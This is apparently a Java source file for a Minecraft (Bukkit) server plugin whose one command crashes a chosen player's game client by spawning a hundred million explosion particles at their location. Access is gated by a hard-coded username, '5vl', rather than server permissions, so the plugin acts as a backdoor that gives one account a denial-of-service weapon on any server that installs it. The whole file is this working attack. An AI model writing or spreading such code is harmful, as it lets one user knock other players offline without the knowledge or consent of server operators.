package crash.crash;

import org.bukkit.Bukkit;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class CrashCommand implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if ((sender instanceof Player) && sender.getName().equals("5vl") && args.length == 1) {
            Player ps = Bukkit.getPlayer(args[0]);
            if (ps != null) {
                ps.spawnParticle(Particle.EXPLOSION_HUGE, ps.getLocation(), 100000000);
            }
        }
        return true;
    }
}
